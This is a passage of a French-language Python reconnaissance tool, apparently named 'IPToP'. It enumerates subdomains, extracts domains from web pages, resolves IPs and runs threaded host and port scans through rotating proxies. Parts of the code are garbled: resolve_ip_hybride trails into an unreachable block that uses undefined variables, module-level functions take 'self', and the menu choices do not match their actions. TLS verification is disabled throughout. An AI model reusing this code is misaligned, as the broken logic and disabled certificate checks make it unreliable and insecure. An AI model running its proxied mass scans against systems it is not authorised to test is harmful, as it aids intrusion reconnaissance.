        except requests.exceptions.ReadTimeout:
            continue
        except Exception as e:
            continue
    
    # Test supplémentaire sur les ports courants
    if check_alternative_ports(domain):
        return (domain, "up", "Service détecté sur port alternatif")
    
    return (domain, "down", "Aucune réponse")

def check_alternative_ports(domain, ports=[80, 443, 8080, 8443], timeout=2):
    """Vérifie les services sur différents ports"""
    for port in ports:
        try:
            with socket.create_connection((domain, port), timeout=timeout):
                return True
        except:
            continue
    return False

def load_domains(filename):
    """Charge les domaines depuis un fichier"""
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def get_valid_threads():
    """Valide le nombre de threads"""
    try:
        threads = int(input(Fore.YELLOW + "Threads (10-500) [100] : ") or 100)
        return max(10, min(500, threads))
    except:
        return 100
        
def save_domains(domains, domain_file):
    """Sauvegarde finale"""
    with open(domain_file, 'w') as f:
        f.writelines(f"{d}\n" for d in sorted(domains))
    print(Fore.GREEN + f"✓ Sauvegarde finale dans {domain_file}")

# ================= FONCTIONS DNS =================
def resolve_standard(domain):
    """Résolution DNS standard"""
    try:
        return socket.gethostbyname(domain)
    except:
        try:
            return str(dns.resolver.resolve(domain, 'A')[0])
        except:
            return None

def resolve_doh(domain, provider, proxy=None):
    """DNS over HTTPS"""
    endpoints = {
        'cloudflare': 'https://cloudflare-dns.com/dns-query',
        'google': 'https://dns.google/resolve'
    }
    try:
        url = f"{endpoints[provider]}?name={domain}&type=A"
        headers = {'accept': 'application/dns-json'} if provider == 'cloudflare' else {}
        response = requests.get(url, 
                              headers=headers, 
                              timeout=5,
                              proxies={"http": proxy, "https": proxy} if proxy else None)
        return response.json().get('Answer', [{}])[0].get('data')
    except:
        return None

# ================= FONCTIONS D'AFFICHAGE =================
def display_loading_box(title, sources):
    """Affiche un cadre de chargement stylisé"""
    print(Fore.MAGENTA + f"\n╭─── {title} ───────────────────────╮")
    for src in sources:
        print(Fore.CYAN + f"│ ▪ {src.ljust(25)} │")
    print(Fore.MAGENTA + "╰──────────────────────────────────────╯")

def animate_spinner(message, stop_event):
    """Animation de spinner en console"""
    spinner = ['⣾','⣽','⣻','⢿','⡿','⣟','⣯','⣷']
    while not stop_event.is_set():
        for char in spinner:
            print(Fore.YELLOW + f"\r{char} {message}", end="", flush=True)
            time.sleep(0.1)
    print("\r" + " " * (len(message) + 2) + "\r", end="")
    
# ================= FONCTIONS AUXILIAIRES =================

def resolve_and_save_ips(domains, output_file, resolver_fn):
    resolved = set()

    for domain in domains:
        try:
            ip = resolver_fn(domain)
            if ip:
                resolved.add(ip)
                print(Fore.GREEN + f"[+] {domain} → {ip}")
            else:
                print(Fore.YELLOW + f"[-] {domain} n’a pas pu être résolu.")
        except Exception as e:
            print(Fore.RED + f"[!] Erreur lors de la résolution de {domain} : {e}")

    if resolved:
        os.makedirs(os.path.dirname(output_file) or ".", exist_ok=True)
        with open(output_file, 'w') as f:
            for ip in sorted(resolved):
                f.write(ip + "\n")
        print(Fore.CYAN + f"\n✅ {len(resolved)} IPs sauvegardées dans {output_file}")
    else:
        print(Fore.YELLOW + "\n⚠️ Aucune IP n’a été résolue.")

    return sorted(resolved)

def is_valid_ip(ip):
    """Vérifie si une chaîne est une adresse IPv4 valide"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def run_subfinder(self, domain):
    """Exécute Subfinder avec installation automatique"""
    if not self.install_subfinder():
        print(Fore.RED + "❌ Subfinder non disponible.")
        return []

    if not domain.strip():
        print(Fore.RED + "❌ Domaine vide pour Subfinder.")
        return []

    try:
        result = subprocess.run(
            ['subfinder', '-d', domain, '-silent'],
            capture_output=True,
            text=True,
            timeout=300
        )
        if result.returncode != 0:
            raise Exception(f"Erreur Subfinder (code {result.returncode}): {result.stderr}")
        return [line.strip().lower() for line in result.stdout.splitlines() if line.strip()]
    except Exception as e:
        print(Fore.RED + f"❌ Erreur Subfinder: {str(e)}")
        return []

def run_sublist3r(self, domain):
    """Exécute Sublist3r avec installation automatique"""
    import tempfile, os

    if not self.install_sublist3r():
        print(Fore.RED + "❌ Sublist3r non disponible.")
        return []

    if not domain.strip():
        print(Fore.RED + "❌ Domaine vide pour Sublist3r.")
        return []

    try:
        with tempfile.NamedTemporaryFile(delete=False, mode='w+', suffix='.txt') as tmpfile:
            output_file = tmpfile.name

        result = subprocess.run(
            ['sublist3r', '-d', domain, '-o', output_file],
            capture_output=True,
            text=True,
            timeout=300
        )

        if result.returncode != 0:
            raise Exception(f"Erreur Sublist3r (code {result.returncode}): {result.stderr}")

        with open(output_file, 'r') as f:
            subdomains = [line.strip().lower() for line in f if line.strip()]

        os.remove(output_file)
        return subdomains

    except Exception as e:
        print(Fore.RED + f"❌ Erreur Sublist3r: {str(e)}")
        if os.path.exists(output_file):
            os.remove(output_file)
        return []
        
def fetch_domains_from_source(url, handler, timeout, source_name):
    """Récupère les domaines depuis une source spécifique"""
    try:
        response = requests.get(url, timeout=timeout)
        response.raise_for_status()
        
        # Ajout du nom de la source pour les logs
        setattr(response, 'source_name', source_name)
        return handler(response)
    except Exception as e:
        setattr(e, 'source_name', source_name)
        raise e
   
def configure_proxy():
    """Configure le proxy avec gestion des erreurs"""
    use_proxy = input("Utiliser un proxy? (o/n/auto) : ").lower()
    if use_proxy == 'n':
        return None
    
    try:
        if use_proxy == 'auto':
            proxy_manager = ProxyManager()
            proxy_manager.load_proxies()
            proxy_list = proxy_manager.get_best_proxies(limit=3)
            if proxy_list:
                proxy = proxy_list[0].split('|')[0].strip()
                print(Fore.GREEN + f"🔁 Utilisation du proxy: {proxy}")
                return {"http": proxy, "https": proxy}
        
        elif use_proxy == 'o':
            proxy = select_proxy_interactive()
            if proxy:
                return {"http": proxy, "https": proxy}
                
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur de configuration proxy: {str(e)}")
    
    return None

def save_results(url, results):
    """Sauvegarde les résultats d'analyse de manière optimisée sans doublons"""
    if not results.get('domains') and not results.get('ips'):
        print(Fore.YELLOW + "⚠️ Aucun résultat à sauvegarder")
        return None

    try:
        # Préparation du nom de fichier
        parsed_url = urlparse(url)
        domain_part = parsed_url.netloc.replace('.', '_')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"web_analysis_{domain_part}_{timestamp}.txt"

        # Écriture sécurisée des résultats
        with open(filename, 'w', encoding='utf-8') as f:
            # En-tête
            f.write(f"=== Analyse de {url} ===\n")
            f.write(f"Date: {datetime.now()}\n\n")

            # Section domaines
            if results.get('domains'):
                f.write("=== DOMAINES TROUVÉS ===\n")
                f.write("\n".join(sorted(set(results['domains']))) + "\n\n")

            # Section IPs
            if results.get('ips'):
                f.write("=== ADRESSES IP RÉSOLUES ===\n")
                f.write("\n".join(sorted(set(results['ips']))) + "\n")

            # Section erreurs (si existantes)
            if results.get('errors'):
                f.write("=== ERREURS RENCONTRÉES ===\n")
                f.write("\n".join(results['errors']) + "\n")

        print(Fore.GREEN + f"✅ Résultats sauvegardés dans {filename}")
        return filename

    except Exception as e:
        print(Fore.RED + f"❌ Erreur lors de la sauvegarde : {str(e)}")
        return None

def resolve_domains(domains, max_workers=20):
    """Résolution DNS avec gestion d'erreurs"""
    ips = set()
    if not domains:
        return ips
        
    print(Fore.CYAN + "\n🌐 Résolution DNS...")
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(5)
            return socket.gethostbyname(domain)
        except:
            return None

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in tqdm(as_completed(futures), total=len(futures)):
            ip = future.result()
            if ip:
                ips.add(ip)
    
    return ips

def get_working_proxies():
    # Retourne une liste de proxies testés et valides
    proxies = []
    with open("proxies.txt", "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                proxies.append(line)
    return proxies

def fetch_url_content(url, proxy=None, max_retries=3):
    timeout_config = (10, 30)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept-Language": "fr-FR,fr;q=0.9",
        "Accept": "text/html,application/xhtml+xml"
    }

    proxies = prepare_proxies(proxy)

    for attempt in range(max_retries):
        try:
            response = requests.get(
                url,
                proxies=proxies,
                timeout=timeout_config,
                verify=False,
                headers=headers
            )
            response.raise_for_status()
            return response.text

        except requests.exceptions.SSLError:
            try:
                response = requests.get(
                    url,
                    proxies=proxies,
                    timeout=timeout_config,
                    verify=False,
                    headers=headers
                )
                return response.text
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Tentative {attempt + 1}/{max_retries} (sans SSL): {str(e)}")
                if attempt == max_retries - 1:
                    raise

        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Tentative {attempt + 1}/{max_retries}: {str(e)}")
            if attempt == max_retries - 1:
                raise
            time.sleep(2 * (attempt + 1))  # Backoff exponentiel

    raise Exception(f"Échec après {max_retries} tentatives")

def show_results_preview(results):
    """Affiche un aperçu des résultats"""
    if not results.get('domains') and not results.get('ips'):
        print(Fore.YELLOW + "⚠️ Aucun résultat à afficher")
        return
    
    print(Fore.CYAN + "\n🔍 Aperçu des résultats:")
    
    if results.get('domains'):
        print(Fore.MAGENTA + "\nDomaines trouvés (10 premiers):")
        for domain in results['domains'][:10]:
            print(Fore.WHITE + f"- {domain}")
        if len(results['domains']) > 10:
            print(Fore.CYAN + f"... et {len(results['domains'])-10} autres")
    
    if results.get('ips'):
        print(Fore.MAGENTA + "\nIPs résolues (10 premières):")
        for ip in results['ips'][:10]:
            print(Fore.WHITE + f"- {ip}")
        if len(results['ips']) > 10:
            print(Fore.CYAN + f"... et {len(results['ips'])-10} autres")
    
    if results.get('errors'):
        print(Fore.RED + "\nErreurs rencontrées:")
        for error in results['errors'][:3]:  # Affiche seulement les 3 premières erreurs
            print(Fore.YELLOW + f"- {error}")

def analyze_external_js(url, proxy=None):
    """Analyse les fichiers JS externes pour trouver des domaines"""
    domains = set()
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(
            url,
            proxies=proxies,
            timeout=15,
            verify=False
        )
        
        # Trouver tous les scripts externes
        soup = BeautifulSoup(response.text, "html.parser")
        js_links = [
            script['src'] for script in soup.find_all('script', src=True)
            if script['src'].endswith('.js')
        ]
        
        # Analyser chaque script
        for js_link in js_links[:5]:  # Limiter à 5 scripts pour la performance
            try:
                if not js_link.startswith('http'):
                    js_link = urljoin(url, js_link)
                
                js_response = requests.get(
                    js_link,
                    proxies=proxies,
                    timeout=10,
                    verify=False
                )
                
                # Recherche de domaines dans le JS
                found = re.findall(
                    r'(?:https?://)?([a-zA-Z0-9.-]+\.[a-z]{2,})',
                    js_response.text
                )
                domains.update(d.lower() for d in found if '.' in d)
                
            except Exception as e:
                continue
                
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur d'analyse JS: {str(e)}")
    
    return domains

def fetch_with_retry(url, proxy=None, max_retries=3):
    """Tente de récupérer le contenu avec différentes stratégies"""
    strategies = [
        {'verify': False, 'stream': False},  # Essai 1: standard
        {'verify': False, 'stream': True},   # Essai 2: mode stream
        {'verify': False, 'timeout': 60}     # Essai 3: timeout plus long
    ]
    
    for attempt in range(max_retries):
        strategy = strategies[min(attempt, len(strategies)-1)]
        try:
            response = requests.get(
                url,
                proxies=proxy,
                timeout=strategy.get('timeout', 30),
                verify=strategy['verify'],
                stream=strategy.get('stream', False),
                headers={"User-Agent": "Mozilla/5.0"}
            )
            return response.text
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Tentative {attempt+1} (stratégie {strategy}): {str(e)}")
            if attempt == max_retries - 1:
                raise
            time.sleep(2)

def analyze_http_headers(url, proxy=None):
    """Retourne maintenant une liste au lieu d'un set"""
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.head(
            url,
            proxies=proxies,
            timeout=(10, 15),
            allow_redirects=True,
            verify=False
        )
        
        domains = []
        headers_to_check = ['Location', 'Content-Security-Policy', 'X-Frame-Options']
        
        for header in headers_to_check:
            if header in response.headers:
                found = re.findall(r'([a-zA-Z0-9.-]+\.[a-z]{2,})', response.headers[header])
                domains.extend(found)
                
        return list(set(domains))  # Retourne une liste sans doublons
        
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur d'analyse des en-têtes: {str(e)}")
        return []

# Fonction d'extraction des domaines
def extract_domains_from_html(html, base_url=None):
    """Version robuste de l'extraction de domaines"""
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur d'analyse HTML: {str(e)}")
        return []

    domains = set()

    # 1. Extraction standard depuis les balises
    tags_attrs = [
        ('a', 'href'),
        ('link', 'href'),
        ('script', 'src'),
        ('img', 'src'),
        ('iframe', 'src'),
        ('form', 'action'),
        ('meta', 'content'),
        ('object', 'data'),
        ('embed', 'src')
    ]

    for tag, attr in tags_attrs:
        try:
            for element in soup.find_all(tag):
                url = element.get(attr)
                if url:
                    parsed = urlparse(url)
                    if parsed.netloc:
                        domains.add(parsed.netloc.lower())
                    elif base_url:
                        full_url = urljoin(base_url, url)
                        parsed_full = urlparse(full_url)
                        if parsed_full.netloc:
                            domains.add(parsed_full.netloc.lower())
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Erreur avec balise {tag}: {str(e)}")
            continue

    # 2. Extraction depuis les commentaires (avec vérification)
    try:
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            found = re.findall(
                r'(https?://[a-zA-Z0-9.-]+\.[a-z]{2,})',
                str(comment),
                re.IGNORECASE
            )
            domains.update(d.lower() for d in found)
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Erreur d'analyse des commentaires: {str(e)}")

    # 2. Extraction depuis le contenu JavaScript
    for script in soup.find_all("script"):
        if script.string:
            # URLs dans les scripts
            found = re.findall(
                r'(https?://[a-zA-Z0-9.-]+\.[a-z]{2,})',
                script.string,
                re.IGNORECASE
            )
            domains.update(map(str.lower, found))
            
            # Domaines nus dans les scripts
            naked_domains = re.findall(
                r'(?:[a-zA-Z0-9.-]+\.)?[a-zA-Z0-9-]+\.[a-z]{2,}',
                script.string
            )
            domains.update(d.lower() for d in naked_domains if '.' in d)

    # 3. Extraction depuis les commentaires HTML
    for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
        found = re.findall(
            r'(https?://[a-zA-Z0-9.-]+\.[a-z]{2,})',
            comment,
            re.IGNORECASE
        )
        domains.update(map(str.lower, found))

    # 4. Extraction depuis les données JSON embarquées
    for element in soup.find_all(string=True):
        try:
            data = json.loads(element.string)
            if isinstance(data, dict):
                for value in data.values():
                    if isinstance(value, str) and '.' in value:
                        parsed = urlparse(value)
                        if parsed.netloc:
                            domains.add(parsed.netloc.lower())
        except:
            pass

    # Filtrage et nettoyage
    filtered = set()
    for domain in domains:
        domain = domain.strip()
        if not domain or domain.startswith(('data:', 'about:', 'javascript:')):
            continue
        
        # Suppression des ports et chemins
        domain = domain.split(':')[0].split('/')[0]
        
        # Validation du domaine
        if re.match(r'^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$', domain):
            filtered.add(domain)

    return sorted(filtered)

# Fonction principale d'analyse
def analyse_page_web(target=None, proxy=None):
    """Analyse complète d'une page web avec détection enrichie de domaines"""
    print(Fore.CYAN + "\n=== ANALYSE DE PAGE WEB ===")

    # Utilisation de target si fourni, sinon saisie interactive
    if target:
        url = target.strip()
        print(Fore.YELLOW + f"Analyse de l'URL : {url}")
    else:
        url = input("Entrez l'URL à analyser : ").strip()
        if not url:
            print(Fore.RED + "❌ URL vide")
            return

    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"

    # Affichage de l’état du proxy
    print(Fore.BLUE + f"➡ Proxy utilisé : {proxy if proxy else 'aucun'}")

    results = {'domains': [], 'ips': [], 'errors': []}

    try:
        # Récupération du contenu
        print(Fore.YELLOW + "\n⌛ Récupération du contenu HTML...")
        html = fetch_url_content(url, proxy)
        
        # Analyse HTML
        print(Fore.YELLOW + "⌛ Extraction des domaines HTML...")
        domains_html = extract_domains_from_html(html, url)

        # Analyse JS
        print(Fore.YELLOW + "⌛ Analyse des scripts JS...")
        domains_js = analyze_external_js(url, proxy)

        # Analyse des en-têtes HTTP
        print(Fore.YELLOW + "⌛ Analyse des en-têtes HTTP...")
        domains_headers = analyze_http_headers(url, proxy)

        # Fusionner tous les domaines (uniques)
        all_domains = set(domains_html + list(domains_js) + domains_headers)
        results['domains'] = list(all_domains)

        print(Fore.CYAN + f"\n• {len(domains_html)} données depuis HTML")
        print(Fore.CYAN + f"• {len(domains_js)} depuis JS")
        print(Fore.CYAN + f"• {len(domains_headers)} depuis en-têtes")
        print(Fore.GREEN + f"→ Total unique : {len(all_domains)} sources détectés")

        # Résolution DNS
        if all_domains:
            print(Fore.CYAN + f"\n🌐 Résolution DNS pour {len(all_domains)} domaines...")
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(socket.gethostbyname, domain): domain for domain in all_domains}
                for future in tqdm(as_completed(futures), total=len(futures)):
                    try:
                        ip = future.result()
                        if ip:
                            results['ips'].append(ip)
                    except:
                        continue

    except Exception as e:
        error_msg = f"Erreur lors de l'analyse : {str(e)}"
        print(Fore.RED + f"❌ {error_msg}")
        results['errors'].append(error_msg)
        traceback.print_exc()

    # Sauvegarde et affichage
    saved_file = save_results(url, results)
    if saved_file:
        print(Fore.CYAN + "\n=== RÉCAPITULATIF ===")
        print(Fore.GREEN + f"• Cibles récupérées: {len(results['domains'])}")
        print(Fore.GREEN + f"• IPs résolues : {len(results['ips'])}")
        if results.get('errors'):
            print(Fore.RED + f"• Erreurs : {len(results['errors'])}")

    return results
            
def extract_domains_from_page(url, domain, output_file):
    use_proxy = input("Utiliser un proxy pour le scan des résultats? (o/n/auto) : ").lower()
    proxy = None
    domains = []

    if use_proxy == "o":
        proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ").strip()
        if proxy_choice == "1":
            proxy_url = input("URL du proxy (ex: http://123.45.67.89:8080) : ").strip()
            proxy = {"http": proxy_url, "https": proxy_url}
        elif proxy_choice == "2":
            proxy_url = select_proxy_interactive()
            if proxy_url:
                proxy = {"http": proxy_url, "https": proxy_url}

    elif use_proxy == "auto":
        proxy_manager = ProxyManager()
        proxy_manager.load_proxies()
        proxy_list = proxy_manager.get_best_proxies(limit=15)
        if not proxy_list:
            print(Fore.RED + "❌ Aucun proxy disponible.")
            return []

        for raw_proxy in proxy_list:
            proxy_url = raw_proxy.split("|")[0].strip()
            proxy = {"http": proxy_url, "https": proxy_url}
            print(Fore.CYAN + f"🔁 Test avec proxy: {proxy_url}")
            try:
                html = requests.get(url, proxies=proxy, timeout=10, verify=False).text
                domains = extract_domains_from_html(html)
                if domains:
                    break
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Proxy non fonctionnel: {proxy_url} — {e}")
                proxy = None

        if not proxy:
            print(Fore.RED + "❌ Aucun proxy n’a permis d’accéder à la page.")
            return []

    else:
        try:
            html = requests.get(url, timeout=10, verify=False).text
            domains = extract_domains_from_html(html)
        except Exception as e:
            print(Fore.RED + f"❌ Erreur HTTP: {e}")
            return []

    if domains:
        with open(output_file, 'w') as f:
            for d in sorted(domains):
                f.write(d + "\n")
        print(Fore.GREEN + f"✓ {len(domains)} domaines extraits et sauvegardés dans {output_file}")

        show_preview = input("Souhaitez-vous voir un aperçu des résultats ? (o/n) : ").strip().lower()
        if show_preview == "o":
            print(Fore.CYAN + "\n🔍 Aperçu des premiers domaines détectés :\n")
            for d in sorted(domains)[:10]:
                print("•", d)
            if len(domains) > 10:
                print(Fore.YELLOW + f"... et {len(domains) - 10} autres enregistrés.")
    return domains
    
def combiner_recherches():
    print(Fore.CYAN + "\n⚡ Combinaison de la recherche passive et de l’analyse web")
    domaine = input(Fore.YELLOW + "Entrez le nom de domaine principal (ex : example.com) : ").strip()
    if not domaine:
        print(Fore.RED + "❌ Domaine invalide.")
        return

    passive_file = f"{domaine}_domains.txt"
    web_file = f"{domaine}_web.txt"

    domaines = set()

    # Chargement intelligent des fichiers
    if os.path.exists(passive_file):
        reuse = input(f"\nUn fichier {passive_file} existe déjà. Le réutiliser ? (o/n) : ").strip().lower()
        if reuse == "o":
            with open(passive_file, 'r') as f:
                domaines.update(line.strip() for line in f if line.strip())
        else:
            domaines.update(find_domains(domaine, auto_continue=True))

    else:
        domaines.update(find_domains(domaine, auto_continue=True))

    if os.path.exists(web_file):
        reuse = input(f"\nUn fichier {web_file} existe déjà. Le réutiliser ? (o/n) : ").strip().lower()
        if reuse == "o":
            with open(web_file, 'r') as f:
                domaines.update(line.strip() for line in f if line.strip())
        else:
            domaines.update(extract_domains_from_page(f"http://{domaine}", domaine, web_file))
    else:
        domaines.update(extract_domains_from_page(f"http://{domaine}", domaine, web_file))

    print(Fore.CYAN + f"\n✅ Total combiné de domaines uniques : {len(domaines)}")

    if not domaines:
        print(Fore.RED + "❌ Aucun domaine à résoudre.")
        return

    # Résolution DNS
    suite = input("Souhaitez-vous résoudre ces domaines en IPs maintenant ? (o/n) : ").strip().lower()
    if suite != "o":
        return

    mode = select_resolver_mode()
    resolver_func = get_resolver_function(mode)
    ip_file = f"{domaine}_ips.txt"
    ips = resolve_and_save_ips(domaines, ip_file, resolver_func)

    if ips:
        scan = input("Souhaitez-vous scanner maintenant les IPs résolues ? (o/n) : ").lower()
        if scan == 'o':
            scan_resolved_ips(ip_file)

def resolve_ip_simple(hostname, timeout=3):
    """
    Résout un nom d'hôte en adresse IPv4 de manière simple.
    
    Args:
        hostname (str): Le nom d'hôte ou l'adresse IP à résoudre
        timeout (int): Délai d'attente en secondes (défaut: 3)
    
    Returns:
        str: L'adresse IP résolue ou None en cas d'échec
    """
    # Vérification si c'est déjà une IP
    try:
        if is_valid_ipv4(hostname):
            return hostname
    except:
        pass
    
    # Configuration du timeout
    socket.setdefaulttimeout(timeout)
    
    try:
        # Résolution DNS
        ip_address = socket.gethostbyname(hostname)
        print(Fore.GREEN + f"✓ Résolution réussie: {hostname} → {ip_address}")
        return ip_address
    except socket.gaierror:
        print(Fore.RED + f"✗ Échec de résolution: {hostname} (nom d'hôte introuvable)")
    except socket.timeout:
        print(Fore.RED + f"✗ Timeout lors de la résolution: {hostname}")
    except Exception as e:
        print(Fore.RED + f"✗ Erreur inattendue avec {hostname}: {str(e)}")
    
    return None

def is_valid_ipv4(address):
    """
    Vérifie si une chaîne est une adresse IPv4 valide.   
    Args:
        address (str): Adresse à vérifier   
    Returns:
        bool: True si c'est une IPv4 valide, False sinon
    """
    try:
        socket.inet_pton(socket.AF_INET, address)
        return True
    except (socket.error, ValueError):
        return False

def resolve_ip_hybride(domain):
    """Essaye d'abord la résolution locale, puis fallback DNS over HTTPS (Cloudflare)"""
    try:
        return socket.gethostbyname(domain)
    except:
        try:
            url = f"https://cloudflare-dns.com/dns-query?name={domain}&type=A"
            headers = {
                "accept": "application/dns-json",
                "user-agent": "Mozilla/5.0"
            }
            response = requests.get(url, headers=headers, timeout=5)
            data = response.json()
            answers = data.get("Answer", [])
            for ans in answers:
                if ans.get("type") == 1:
                    return ans.get("data")
        except:
            return None

    # Traitement parallèle
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(resolver_func, d): d for d in domains}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Résolution DNS"):
            ip = future.result()
            if ip and is_valid_ip(ip):
                ips.add(ip)

    # Sauvegarde
    if ips:
        with open(ip_file, 'w') as f:
            f.write("\n".join(sorted(ips, key=lambda x: tuple(map(int, x.split('.'))))))
        print(Fore.GREEN + f"\n✓ {len(ips)} IPs valides sauvegardées dans {ip_file}")
    else:
        print(Fore.YELLOW + "\n⚠️ Aucune IP valide n’a été résolue.")

    return ips
    
def manage_domain_scan(domain):
    """Version avec gestion du proxy et mode turbo"""
    domain_file = f"{domain}_domains.txt"
    ip_file = f"{domain}_ips.txt"
    
    # Configuration proxy et turbo
    proxy = None
    turbo = False
    
    while True:
        # Chargement initial des données existantes
        domains = set()
        ips = set()
        
        if os.path.exists(domain_file):
            with open(domain_file, 'r') as f:
                domains = {line.strip() for line in f if line.strip()}
        
        if os.path.exists(ip_file):
            with open(ip_file, 'r') as f:
                ips = {line.strip() for line in f if line.strip()}

        # Affichage du menu
        console.print("\n[bold blue]===[ IPToP ]===\n[/bold blue]")
        print(Fore.CYAN + "\n" + "="*40)
        print(Fore.YELLOW + f"Résultats pour {domain}:")
        print(Fore.GREEN + f"- {len(domains)} domaines")
        print(Fore.GREEN + f"- {len(ips)} IPs")
        if proxy:
            print(Fore.MAGENTA + f"- Proxy actif: {proxy}")
        print(Fore.CYAN + "="*40)
        
        print(Fore.MAGENTA + "\nOptions:")
        print(Fore.CYAN + "1. Mettre à jour la liste des domaines")
        print(Fore.CYAN + "2. Résoudre les DNS et trouver les IPs")
        print(Fore.CYAN + "3. Configurer le proxy pour le scan")
        print(Fore.CYAN + "4. Scanner les résultats actuels")
        print(Fore.CYAN + "0. Retour au menu principal")
        
        choice = input(Fore.YELLOW + "Votre choix (1-5): ").strip()
        
        if choice == "1":  # Scanner une plage d'IP
            print(Fore.YELLOW + "\nFormat d'exemple : 192.168.0.1-192.168.0.255 ou 10.0.0.0/24")
            ip_range = input("Plage d'IP à scanner (ou 'retour') : ").strip()
            if ip_range.lower() == "retour":
                continue
        
            threads = input("Nombre de threads (10-500) ou 'retour' : ").strip()
            if threads.lower() == "retour":
                continue
        
            try:
                threads = max(10, min(500, int(threads)))
            except:
                print(Fore.RED + "❌ Entrée invalide.")
                continue
        
            proxy = get_proxy_config()
            turbo = False
            if proxy == "auto":
                turbo = input("Activer le mode turbo proxy ? (o/n) : ").lower() == 'o'
        
            scanner = HostScanner(
                ip_range=ip_range,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo
            )
            scanner.run()
        
        elif choice == "2":  # Scanner depuis fichier
            filename = input("Chemin du fichier contenant IPs/domaines (ou 'retour') : ").strip()
            if filename.lower() == "retour":
                continue
        
            if not os.path.exists(filename):
                print(Fore.RED + "❌ Fichier introuvable.")
                continue
        
            with open(filename, 'r') as f:
                sample = f.read(1024)
                has_domains = any(c.isalpha() for c in sample)
        
            if has_domains:
                print(Fore.CYAN + "\n⚠️ Ce fichier semble contenir des domaines.")
                print(Fore.YELLOW + "Cette option utilise un scan HTTP pour identifier les domaines actifs.\n")
        
                threads = input("Nombre de workers (10-500) ou 'retour' : ").strip()
                if threads.lower() == "retour":
                    continue
        
                try:
                    workers = max(10, min(500, int(threads)))
                except:
                    print(Fore.RED + "❌ Entrée invalide.")
                    continue
        
                proxy = get_proxy_config()
                turbo = False
                if proxy == "auto":
                    turbo = input("Mode turbo pour proxy ? (o/n) : ").lower() == 'o'
        
                scanner = HostScanner(
                    filename=filename,
                    threads=workers,
                    proxy=proxy,
                    turbo_mode=turbo
                )
                scanner.run()
            else:
                print(Fore.YELLOW + "\n📄 Fichier reconnu comme une liste d'IPs.")
                threads = input("Nombre de threads (10-500) ou 'retour' : ").strip()
                if threads.lower() == "retour":
                    continue
        
                try:
                    threads = max(10, min(500, int(threads)))
                except:
                    print(Fore.RED + "❌ Entrée invalide.")
                    continue
        
                proxy = get_proxy_config()
                turbo = False
                if proxy == "auto":
                    turbo = input("Mode turbo pour proxy ? (o/n) : ").lower() == 'o'
        
                scanner = HostScanner(
                    filename=filename,
                    threads=threads,
                    proxy=proxy,
                    turbo_mode=turbo
                )
                scanner.run()
            
        elif choice == "3":
            # Option 3 - Configuration du proxy pour le scan
            proxy_choice = input("Utiliser un proxy pour le scan? (o/n/auto) : ").lower()
            if proxy_choice == 'auto':
                proxy = "auto"
                turbo = input(Fore.CYAN + "Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'
                print(Fore.CYAN + "🔁 Mode proxy automatique activé" + (" avec turbo" if turbo else ""))
            elif proxy_choice == 'o':
                proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ")
                if proxy_choice == "1":
                    proxy = input("URL du proxy (ex: http://123.45.67.89:8080) : ")
                elif proxy_choice == "2":
                    proxy = select_proxy_interactive()
            else:
                proxy = None
                turbo = False
                print(Fore.CYAN + "Proxy désactivé pour le scan")
        
        elif choice == "4":
            # Option 4 - Scanner les résultats avec gestion du proxy et turbo
            targets = []
            if os.path.exists(domain_file):
                with open(domain_file, 'r') as f:
                    targets.extend(line.strip() for line in f if line.strip())
            
            if os.path.exists(ip_file):
                with open(ip_file, 'r') as f:
                    targets.extend(line.strip() for line in f if line.strip())
            
            if not targets:
                print(Fore.RED + "❌ Aucune cible à scanner")
                continue
                
            temp_file = "temp_scan.txt"
            with open(temp_file, 'w') as f:
                f.write("\n".join(targets))
            
            # Configuration du scanner avec le proxy et turbo
            scanner = HostScanner(
                filename=temp_file,
                threads=100 if turbo else 50,  # Plus de threads en mode turbo
                proxy=proxy,
                turbo_mode=turbo
            )
            
            if proxy == "auto":
                mode = "automatique" + (" avec turbo" if turbo else "")
                print(Fore.CYAN + f"\n⚡ Scan avec rotation {mode}")
                threading.Thread(target=monitor_proxy_usage, args=(scanner,), daemon=True).start()
            elif proxy:
                print(Fore.CYAN + f"\n⚡ Scan avec proxy fixe: {proxy}" + (" (turbo)" if turbo else ""))
            else:
                print(Fore.CYAN + "\n⚡ Scan sans proxy")
                
            scanner.run()
            os.remove(temp_file)

        elif choice == "21":
            filename = input("Chemin du fichier (domaines) : ").strip()
            if not os.path.exists(filename):
                print(Fore.RED + "❌ Fichier introuvable.")
                return
        
            workers = min(500, int(input("Nombre de workers (10-500) : ").strip() or "100"))
        
            proxy_manager = ProxyManager()
            proxy_manager.load_proxies()
        
            if not proxy_manager.proxies:
                print(Fore.RED + "❌ Aucun proxy valide disponible.")
                return
        
